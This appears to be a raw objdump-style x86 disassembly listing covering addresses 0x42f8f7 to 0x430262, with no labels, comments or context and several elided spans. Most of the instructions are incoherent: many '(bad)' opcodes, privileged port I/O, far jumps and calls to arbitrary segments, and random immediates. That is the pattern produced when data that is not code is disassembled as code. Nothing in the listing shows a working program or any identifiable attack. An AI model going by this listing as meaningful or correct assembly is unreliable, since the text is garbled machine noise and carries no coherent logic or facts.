  42f8f7:	hlt    
  42f8f8:	popa   
  42f8f9:	mov    ebx,DWORD PTR [eax-0x738b69c8]
  42f8ff:	adc    al,0x1c
  42f901:	fdivrp st(2),st
  42f903:	std    
  42f904:	out    dx,al
  42f905:	mov    ds:0x4b38b738,al
  42f90a:	dec    esp
  42f90b:	arpl   cx,bx
  42f90d:	ret    
  42f90e:	mov    es:0xec,al
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f98f
  42f981:	outs   dx,DWORD PTR ds:[esi]
  42f982:	shl    cl,1
  42f984:	lahf   
  42f985:	inc    BYTE PTR [ecx]
  42f987:	add    BYTE PTR ds:0xdc000001,al
  42f98d:	and    al,0x7f
  42f98f:	das    
  42f990:	jnp    0x42f923
  42f992:	dec    ecx
  42f993:	in     al,dx
  42f994:	add    eax,ebp
  42f996:	lahf   
  42f997:	and    BYTE PTR [esi],ah
  42f999:	mov    BYTE PTR [eax],dh
  42f99b:	mov    es,ecx
  42f99d:	jp     0x42fa13
  42f99f:	dec    eax
  42f9a0:	pusha  
  42f9a1:	mul    DWORD PTR [esi]
  42f9a3:	mov    esp,0x23c81530
  42f9a8:	adc    eax,0x9b4d3ca7
  42f9ad:	leave  
  42f9ae:	sub    al,0x2
  42f9b0:	(bad)  
  42f9b1:	outs   dx,BYTE PTR ds:[esi]
  42f9b2:	das    
  42f9b3:	or     bh,BYTE PTR [edi]
  42f9b5:	cmp    eax,0xe7063b72
  42f9ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9bb:	shr    ah,1
  42f9bd:	pop    ecx
  42f9be:	xor    al,BYTE PTR [edx-0x7c296020]
  42f9c4:	stos   BYTE PTR es:[edi],al
  42f9c5:	adc    ebx,DWORD PTR [esi]
  42f9c7:	jmp    FWORD PTR [edx+0x7]
  42f9ca:	sbb    bh,0x6f
  42f9cd:	fdivr  DWORD PTR [edi-0x753973ad]
  42f9d3:	aad    0x25
  42f9d5:	jnp    0x42f9ee
  42f9d7:	dec    ebx
  42f9d8:	xchg   edx,eax
  42f9d9:	jmp    0x42f983
  42f9db:	pop    eax
  42f9dc:	inc    esi
  42f9dd:	and    BYTE PTR [eax],0x11
  42f9e0:	jmp    DWORD PTR ds:0xd8efc278
  42f9e6:	dec    esp
  42f9e7:	out    dx,eax
  42f9e8:	loopne 0x42f9f2
  42f9ea:	mov    edi,0x967f94f4
  42f9ef:	sbb    DWORD PTR [edx],ebx
  42f9f1:	jle    0x42f9e5
  42f9f3:	ret    0x4985
  42f9f6:	push   cs
  42f9f7:	popf   
  42f9f8:	out    dx,al
  42f9f9:	adc    DWORD PTR [ebp+0x35],edi
  42f9fc:	sub    eax,0xf92481c8
  42fa01:	jmp    0x42f9e7
  42fa03:	xchg   edi,eax
  42fa04:	in     al,dx
  42fa05:	and    al,0x1
  42fa07:	into   
  42fa08:	mov    al,0x24
  42fa0a:	dec    edi
  42fa0b:	inc    ebx
  42fa0c:	adc    al,0x7a
  42fa0e:	xchg   esp,eax
  42fa0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa10:	leave  
  42fa11:	shl    BYTE PTR [edx],1
  42fa13:	sub    eax,0xad2d6e22
  42fa18:	(bad)  
  42fa19:	mov    ah,0x20
  42fa1b:	xchg   edx,eax
  42fa1c:	push   edi
  42fa1d:	jge    0x42fa4e
  42fa1f:	loope  0x42fa59
  42fa21:	add    al,0xeb
  42fa23:	adc    edx,0x28ed0ed7
  42fa29:	loopne 0x42fa38
  42fa2b:	fwait
  42fa2c:	jl     0x42f9bb
  42fa2e:	dec    ecx
  42fa2f:	or     BYTE PTR [eax+0x5010e8e7],dl
  42fa35:	enter  0xafda,0x27
  42fa39:	es xor al,0xec
  42fa3c:	inc    eax
  42fa3d:	adc    eax,0x96bbe4db
  42fa42:	jo     0x42fa94
  42fa44:	shl    BYTE PTR [eax],0x79
  42fa47:	mov    ds:0x91c01437,eax
  42fa4c:	add    BYTE PTR [ebp+ebp*2+0x401c629f],bh
  42fa53:	xchg   edi,eax
  42fa54:	test   al,0xf1
  42fa56:	mov    ebp,0x3181e7f5
  42fa5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa5c:	pop    edx
  42fa5d:	dec    ebp
  42fa5e:	rol    DWORD PTR [esi+0x27],0x3
  42fa62:	popf   
  42fa63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa64:	test   eax,0x9fb4a9a7
  42fa69:	xchg   edx,eax
  42fa6a:	xlat   BYTE PTR ds:[ebx]
  42fa6b:	sbb    al,0xf4
  42fa6d:	mov    eax,0xb933b971
  42fa72:	adc    al,0xe9
  42fa74:	stos   DWORD PTR es:[edi],eax
  42fa75:	xchg   DWORD PTR [edi-0xed75e44],edx
  42fa7b:	pop    ds
  42fa7c:	push   ebx
  42fa7d:	and    DWORD PTR [eax-0x7af700c5],0xffffffe5
  42fa84:	stc    
  42fa85:	mov    ecx,DWORD PTR [esi+0x57a87774]
  42fa8b:	dec    edx
  42fa8c:	in     eax,dx
  42fa8d:	lods   eax,DWORD PTR ds:[esi]
  42fa8e:	retf   0x2872
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	nop
  42fb01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb02:	mov    eax,0x1ffa4b0
  42fb07:	add    BYTE PTR ds:0xf6000001,al
  42fb0d:	xor    al,dh
  42fb0f:	adc    esp,edx
  42fb11:	jg     0x42fb83
  42fb13:	mov    ah,0xf3
  42fb15:	aaa    
  42fb16:	(bad)  
  42fb17:	xor    eax,0x3de1122f
  42fb1c:	sbb    eax,0xa8c92fc5
  42fb21:	sbb    al,0xe3
  42fb23:	dec    edx
  42fb24:	mov    ebp,ecx
  42fb26:	push   0x56
  42fb28:	fwait
  42fb29:	int3   
  42fb2a:	int    0xbb
  42fb2c:	xor    cl,BYTE PTR [edx]
  42fb2e:	test   al,0x5f
  42fb30:	xor    eax,0xface6181
  42fb35:	mov    bh,0x6b
  42fb37:	(bad)  
  42fb38:	(bad)  
  42fb39:	iret   
  42fb3a:	fldenv [ebx]
  42fb3c:	jmp    0x3a7d5027
  42fb41:	lea    edx,[eax]
  42fb43:	pop    esi
  42fb44:	jp     0x42fb7b
  42fb46:	fmul   st(0),st
  42fb48:	jmp    0xa40eb017
  42fb4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb4e:	sub    edx,DWORD PTR [ecx]
  42fb50:	mov    dh,0x33
  42fb52:	les    ebx,FWORD PTR [ebx+0x500ee1f]
  42fb58:	daa    
  42fb59:	jae    0x42faf8
  42fb5b:	gs ins DWORD PTR es:[edi],dx
  42fb5d:	push   eax
  42fb5e:	in     al,0x24
  42fb60:	ficom  WORD PTR [edx-0x68]
  42fb63:	push   0x9458e6db
  42fb68:	cs int 0x17
  42fb6b:	ja     0x42fb10
  42fb6d:	sub    eax,esp
  42fb6f:	xchg   esp,eax
  42fb70:	rol    DWORD PTR [esp+ebx*8-0x1b1110fa],cl
  42fb77:	jl     0x42faf9
  42fb79:	pop    es
  42fb7a:	call   0x61bb:0x4f0804ed
  42fb81:	(bad)  
  42fb82:	mov    cl,0x72
  42fb84:	pop    esp
  42fb85:	imul   esi,DWORD PTR ds:0xbd5af2c0,0xffffff90
  42fb8c:	jne    0x42fb1d
  42fb8e:	push   ds
  42fb8f:	mov    bl,0x3
  42fb91:	lahf   
  42fb92:	mov    edx,0xa63cb604
  42fb97:	xlat   BYTE PTR ds:[ebx]
  42fb98:	push   0x48b6239
  42fb9d:	and    al,0xee
  42fb9f:	mov    ch,0x9c
  42fba1:	dec    esi
  42fba2:	iret   
  42fba3:	push   edi
  42fba4:	pop    edi
  42fba5:	sbb    al,0x49
  42fba7:	push   es
  42fba8:	popa   
  42fba9:	div    BYTE PTR [edi]
  42fbab:	mov    esi,0x175a9e17
  42fbb0:	scas   eax,DWORD PTR es:[edi]
  42fbb1:	add    al,al
  42fbb3:	fisttp WORD PTR [ebp-0x11]
  42fbb6:	out    0xc5,al
  42fbb8:	fs push cs
  42fbba:	add    edx,DWORD PTR [ebx-0x9a808ed]
  42fbc0:	outs   dx,DWORD PTR ds:[esi]
  42fbc1:	inc    esi
  42fbc2:	pop    esi
  42fbc3:	mov    ss,WORD PTR [edx]
  42fbc5:	jb     0x42fbca
  42fbc7:	daa    
  42fbc8:	popa   
  42fbc9:	dec    ebp
  42fbca:	push   ss
  42fbcb:	and    eax,DWORD PTR es:[eax]
  42fbce:	loopne 0x42fbfd
  42fbd0:	mov    al,ds:0xa358913a
  42fbd5:	hlt    
  42fbd6:	dec    ebx
  42fbd7:	xchg   ebp,eax
  42fbd8:	cmc    
  42fbd9:	jmp    0x42fbe5
  42fbdb:	mov    ch,0xdf
  42fbdd:	pop    es
  42fbde:	cli    
  42fbdf:	mov    ebp,0x5f4f6934
  42fbe4:	jmp    FWORD PTR gs:[edi-0x28]
  42fbe8:	and    BYTE PTR [esi+0x74cc4ba5],dh
  42fbee:	xor    al,BYTE PTR [ebx-0x4eae6cf7]
  42fbf4:	bound  esp,QWORD PTR [ebx+0x4b]
  42fbf7:	test   eax,0x9a851205
  42fbfc:	mov    ebp,0x4f6ff24a
  42fc01:	mov    bh,cl
  42fc03:	out    0x8c,eax
  42fc05:	scas   al,BYTE PTR es:[edi]
  42fc06:	xlat   BYTE PTR ds:[ebx]
  42fc07:	in     al,dx
  42fc08:	push   es
  42fc09:	hlt    
  42fc0a:	das    
  42fc0b:	dec    eax
  42fc0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc0d:	pop    esi
  42fc0e:	push   edi
  42fc0f:	sbb    DWORD PTR [ebp+0x0],ebp
	...
  42fc72:	add    BYTE PTR [eax],al
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [edi-0x56fb9991],bl
  42fc85:	add    BYTE PTR [edx],al
  42fc87:	add    BYTE PTR ds:0xa3000001,al
  42fc8d:	stos   DWORD PTR es:[edi],eax
  42fc8e:	dec    esi
  42fc8f:	jmp    0x3a75:0x717b52dd
  42fc96:	xchg   DWORD PTR ds:0x792980d7,eax
  42fc9c:	daa    
  42fc9d:	push   ds
  42fc9e:	in     eax,0x5f
  42fca0:	fistp  WORD PTR [ebx+0x4e]
  42fca3:	fcomp  QWORD PTR fs:[eax-0x18]
  42fca7:	and    eax,DWORD PTR [esi]
  42fca9:	imul   BYTE PTR [ebx+0x3cb93d7]
  42fcaf:	pop    edi
  42fcb0:	pop    ebp
  42fcb1:	add    BYTE PTR [edx-0xe],ah
  42fcb4:	fidivr DWORD PTR [eax+0x66554177]
  42fcba:	mov    ch,0xb
  42fcbc:	or     al,0xb3
  42fcbe:	ds data16 lahf 
  42fcc1:	pop    edx
  42fcc2:	aas    
  42fcc3:	fwait
  42fcc4:	inc    ecx
  42fcc5:	pop    edi
  42fcc6:	fld    TBYTE PTR [esi]
  42fcc8:	ins    DWORD PTR es:[edi],dx
  42fcc9:	cmp    BYTE PTR [ebx],ch
  42fccb:	jo     0x42fd28
  42fccd:	lea    edi,[ebx+eiz*4]
  42fcd0:	fcomp  QWORD PTR [edx+0x162577d5]
  42fcd6:	(bad)
  42fcd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcda:	and    DWORD PTR [edi+0x43],0xa132567e
  42fce1:	xchg   BYTE PTR [eax-0x54],cl
  42fce4:	ret    0x1101
  42fce7:	cwde   
  42fce8:	lea    edi,[ebx-0x5]
  42fceb:	arpl   dx,si
  42fced:	stos   DWORD PTR es:[edi],eax
  42fcee:	jb     0x42fd23
  42fcf0:	(bad)  
  42fcf2:	cwde   
  42fcf3:	dec    esi
  42fcf4:	mov    eax,ds:0x717b2ca
  42fcf9:	mov    eax,0xfa8e1826
  42fcfe:	ret    
  42fcff:	xchg   edx,eax
  42fd00:	or     bl,ch
  42fd02:	dec    edi
  42fd03:	dec    BYTE PTR [edx+esi*4]
  42fd06:	repz inc ecx
  42fd08:	push   0xb5cd7588
  42fd0d:	pop    ebp
  42fd0e:	mov    dl,dh
  42fd10:	addr16 imul edx,ebp,0x4185497a
  42fd17:	aad    0x3b
  42fd19:	push   0xa315b80b
  42fd1e:	mov    bh,ch
  42fd20:	pop    edx
  42fd21:	dec    edi
  42fd22:	mov    al,ds:0x107e8455
  42fd27:	nop
  42fd28:	or     edi,edx
  42fd2a:	sbb    ecx,DWORD PTR [ebx-0xb]
  42fd2d:	sbb    ebp,DWORD PTR [ebx-0x77b9e05f]
  42fd33:	and    al,0xff
  42fd35:	jmp    0x42fce3
  42fd37:	(bad)  
  42fd38:	(bad)  [ebp+edi*1-0x2c]
  42fd3c:	cmp    BYTE PTR [eax],ah
  42fd3e:	mov    cl,0x84
  42fd40:	xchg   edi,eax
  42fd41:	pusha  
  42fd42:	or     BYTE PTR [ebx+0xa],0x79
  42fd46:	fdiv   st(0),st
  42fd48:	imul   DWORD PTR [ebx]
  42fd4a:	sub    al,0xe
  42fd4c:	enter  0x8e04,0x5a
  42fd50:	ins    DWORD PTR es:[edi],dx
  42fd51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd52:	dec    eax
  42fd53:	out    0x5f,al
  42fd55:	mov    BYTE PTR [edx-0x60],dl
  42fd58:	adc    eax,0x8904ec75
  42fd5d:	fs xchg ecx,eax
  42fd5f:	add    eax,0xfe1e5d74
  42fd64:	mov    fs:0x6f491f6,eax
  42fd6a:	out    dx,al
  42fd6b:	pushf  
  42fd6c:	cmp    al,0xef
  42fd6e:	or     DWORD PTR [esp+eax*8],esi
  42fd71:	jns    0x42fd36
  42fd73:	mov    cl,BYTE PTR [esi]
  42fd75:	mov    eax,ds:0x629aed89
  42fd7a:	jge    0x42fdb2
  42fd7c:	dec    edi
  42fd7d:	ss sbb ah,bl
  42fd80:	(bad)  
  42fd81:	xor    edi,edx
  42fd83:	shufps xmm3,XMMWORD PTR [eax-0x1e53c08],0xf9
  42fd8b:	out    dx,eax
  42fd8c:	sbb    al,BYTE PTR [ebp-0x76]
  42fd8f:	pop    es
  42fd90:	imul   eax,DWORD PTR [eax],0x0
	...
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz fbstp TBYTE PTR [eax+0x1aee2f6]
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    eax,0x51000001
  42fe0d:	jno    0x42fdab
  42fe0f:	push   ecx
  42fe10:	sbb    bl,BYTE PTR [ebp+0x2e]
  42fe13:	cld    
  42fe14:	xchg   esi,eax
  42fe15:	and    dl,BYTE PTR ds:0xe9821d8b
  42fe1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe1c:	je     0x42fe63
  42fe1e:	pop    edx
  42fe1f:	call   0x6dbe:0xc4c5143d
  42fe26:	mov    DWORD PTR [edi-0x73],esp
  42fe29:	loop   0x42fe05
  42fe2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe2c:	je     0x42fea0
  42fe2e:	repz call 0xa2ee:0xa8e6ed6b
  42fe36:	xchg   edx,eax
  42fe37:	lahf   
  42fe38:	xchg   edx,eax
  42fe39:	xchg   edi,eax
  42fe3a:	jg     0x42fe27
  42fe3c:	mov    ds,WORD PTR [esi+edi*8-0x52]
  42fe40:	jno    0x42fe3d
  42fe42:	cmp    ah,BYTE PTR [eax+0x5]
  42fe45:	cdq    
  42fe46:	call   0x20:0x8389eb1e
  42fe4d:	pop    es
  42fe4e:	pop    esi
  42fe4f:	in     eax,0x43
  42fe51:	popa   
  42fe52:	mov    ah,0x7a
  42fe54:	mov    ebx,DWORD PTR [edx+0xebae67b]
  42fe5a:	pop    esp
  42fe5b:	(bad)  
  42fe5c:	mov    ch,0x76
  42fe5e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42fe60:	sbb    ch,al
  42fe62:	inc    eax
  42fe63:	clc    
  42fe64:	push   es
  42fe65:	loope  0x42fedf
  42fe67:	test   al,0x5
  42fe69:	jp     0x42fee2
  42fe6b:	stos   DWORD PTR es:[edi],eax
  42fe6c:	or     eax,0x674b44e
  42fe71:	dec    esp
  42fe72:	xchg   esi,eax
  42fe73:	mov    eax,ds:0x5e909ac5
  42fe78:	int3   
  42fe79:	xchg   DWORD PTR [esi],eax
  42fe7b:	shr    BYTE PTR [ecx],1
  42fe7d:	test   al,0xf
  42fe7f:	call   0x8111:0x3c855533
  42fe86:	repz test al,0x4
  42fe89:	mov    ecx,0xcc0e9294
  42fe8e:	imul   ecx,DWORD PTR [edx],0x1b
  42fe91:	retf   0xcf1b
  42fe94:	fwait
  42fe95:	clc    
  42fe96:	dec    esi
  42fe97:	push   cs
  42fe98:	and    BYTE PTR [ecx-0xfaad44c],0xa2
  42fe9f:	or     BYTE PTR [eax-0x7b44433],dl
  42fea5:	in     al,dx
  42fea6:	out    dx,eax
  42fea7:	pop    es
  42fea8:	pop    esp
  42fea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42feaa:	leave  
  42feab:	loop   0x42ff0f
  42fead:	call   0x43f3a599
  42feb2:	aas    
  42feb3:	mov    WORD PTR [eax],ds
  42feb5:	sbb    al,0x8
  42feb7:	fs fs inc esi
  42feba:	js     0x42fef4
  42febc:	add    al,0xb9
  42febe:	xor    al,0x44
  42fec0:	sub    eax,0xdb572e4a
  42fec5:	(bad)  
  42fec7:	lock pop edx
  42fec9:	xor    bh,BYTE PTR [ebx+0x6e18850b]
  42fecf:	call   0x3c91:0xe74c5c5a
  42fed6:	sbb    cl,BYTE PTR [esi]
  42fed8:	jmp    0xd635a4fa
  42fedd:	cmp    esi,DWORD PTR [ebx+0x59]
  42fee0:	and    eax,0x8de78767
  42fee5:	and    ebx,ecx
  42fee7:	jl     0x42feec
  42fee9:	adc    dh,BYTE PTR [edi]
  42feeb:	fdiv   QWORD PTR [ecx-0x7f]
  42feee:	cwde   
  42feef:	mov    ?,WORD PTR [edi]
  42fef1:	sbb    BYTE PTR [esi-0x635222b7],0xb7
  42fef8:	mov    esi,0x3de0265d
  42fefd:	lock adc edi,ecx
  42ff00:	das    
  42ff01:	dec    edi
  42ff02:	aad    0xae
  42ff04:	mov    esi,0xe9dfa308
  42ff09:	add    BYTE PTR es:[esi+0x72],ah
  42ff0d:	out    dx,eax
  42ff0e:	add    bl,BYTE PTR [edx+0x1f]
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [edx+esi*2-0x2c],0x22
  42ff83:	mov    ds:0x202b3,al
  42ff88:	mov    edi,0x34000000
  42ff8d:	sbb    al,0x69
  42ff8f:	rcr    BYTE PTR [ecx-0x7b772dd7],1
  42ff95:	pop    ecx
  42ff96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ff97:	rol    ebx,1
  42ff99:	xchg   edi,eax
  42ff9a:	setae  BYTE PTR [esi]
  42ff9d:	pushf  
  42ff9e:	push   es
  42ff9f:	lds    edx,FWORD PTR [ebp-0x344487f6]
  42ffa5:	xchg   esp,eax
  42ffa6:	sbb    al,0x15
  42ffa8:	(bad)  
  42ffa9:	dec    ebx
  42ffaa:	mov    dl,0xed
  42ffac:	dec    eax
  42ffad:	adc    al,0x7b
  42ffaf:	jno    0x42ff8d
  42ffb1:	jmp    0x75fc023c
  42ffb6:	xlat   BYTE PTR ds:[ebx]
  42ffb7:	shl    BYTE PTR [bx],1
  42ffba:	sbb    BYTE PTR es:[edx+esi*4+0x12],cl
  42ffbf:	mov    ebp,0x38c9688f
  42ffc4:	mov    al,0x8
  42ffc6:	loopne 0x42ff93
  42ffc8:	sti    
  42ffc9:	dec    esi
  42ffca:	jne    0x42ff58
  42ffcc:	push   ebp
  42ffcd:	jl     0x430022
  42ffcf:	mov    esi,0xc0965b05
  42ffd4:	test   DWORD PTR [ebx+0x6e9430f4],ebx
  42ffda:	dec    edx
  42ffdb:	daa    
  42ffdc:	dec    esi
  42ffdd:	lds    ebp,FWORD PTR [esi]
  42ffdf:	add    al,0xd6
  42ffe1:	ss out 0x6a,eax
  42ffe4:	dec    ebp
  42ffe5:	add    DWORD PTR [ebp+0x2f],esi
  42ffe8:	pushf  
  42ffe9:	repz dec eax
  42ffec:	jbe    0x430008
  42ffee:	call   0x90fd38e8
  42fff3:	jmp    0x42ffec
  42fff5:	inc    ecx
  42fff6:	jb     0x42ffa7
  42fff8:	retf   0xf704
  42fffb:	xor    ebp,DWORD PTR [ebp-0x5355606e]
  430001:	add    eax,0x98811e4e
  430006:	cmp    DWORD PTR ds:[esp+eax*4-0x1],eax
  43000b:	ds dec edi
  43000d:	int    0x53
  43000f:	cmp    bh,BYTE PTR [esi]
  430011:	inc    edx
  430012:	push   0xffffffb7
  430014:	fcmovnb st,st(0)
  430016:	jno    0x42fff6
  430018:	frstor [esi-0x5ea6b41d]
  43001e:	xchg   esi,eax
  43001f:	push   esi
  430020:	sbb    BYTE PTR [eax-0x42],bl
  430023:	pop    es
  430024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430025:	enter  0xc7e,0xc9
  430029:	mov    al,0xa2
  43002b:	cdq    
  43002c:	aam    0x67
  43002e:	out    dx,al
  43002f:	fbstp  TBYTE PTR [edi-0x79629514]
  430035:	mov    ch,BYTE PTR [edx+0x573a642a]
  43003b:	mov    bh,0xeb
  43003d:	jmp    0x7eec0928
  430042:	lds    edi,FWORD PTR [ebp+0x35c27545]
  430048:	pop    esi
  430049:	lods   al,BYTE PTR ds:[esi]
  43004a:	stos   DWORD PTR es:[edi],eax
	...
  430073:	add    BYTE PTR [ebp+0x55],cl
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
